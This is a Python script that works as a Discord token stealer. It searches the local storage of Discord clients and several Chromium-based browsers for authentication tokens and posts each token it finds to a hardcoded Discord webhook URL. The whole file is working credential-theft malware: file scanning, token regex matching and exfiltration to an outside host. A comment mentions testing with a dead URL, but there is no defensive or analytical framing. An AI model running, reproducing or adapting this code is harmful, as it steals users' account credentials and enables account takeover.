import os
import re
import requests

def get_discord_paths():
    paths = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    platforms = {
        "Discord": os.path.join(roaming, "Discord"),
        "Discord Canary": os.path.join(roaming, "discordcanary"),
        "Discord PTB": os.path.join(roaming, "discordptb"),
        "Google Chrome": os.path.join(local, "Google", "Chrome", "User Data", "Default"),
        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default"),
        "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
    }

    for name, path in platforms.items():
        leveldb = os.path.join(path, "Local Storage", "leveldb")
        if os.path.exists(leveldb):
            paths.append(leveldb)
    return paths

def send_to_webhook(token, webhook_url):
    data = {
        "content": f"Found token: {token}"
    }
    try:
        response = requests.post(webhook_url, json=data)
        print(f"Sent token to webhook: {token} (status {response.status_code})")
    except Exception as e:
        print(f"Failed sending token: {e}")

def token_grabber(webhook_url):
    token_regex = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
    paths = get_discord_paths()
    print("Starting token grabber...")

    for path in paths:
        try:
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                with open(os.path.join(path, file_name), 'r', errors='ignore') as file:
                    for line in file:
                        for token in re.findall(token_regex, line):
                            print(f"Found token: {token}")
                            send_to_webhook(token, webhook_url)
        except Exception as e:
            print(f"Error reading files: {e}")

if __name__ == "__main__":
    # Put your webhook URL here; for testing use a dead URL or localhost server
    webhook = "https://discord.com/api/webhooks/1380512960350392380/t5hhKdcM-gdrMWnvD7ddXeivkw9x57_9NQ4apaAKCAruvHdChLkx6Gdj_do5x_GlUeoa"
    token_grabber(webhook)
    input("Press Enter to exit...")

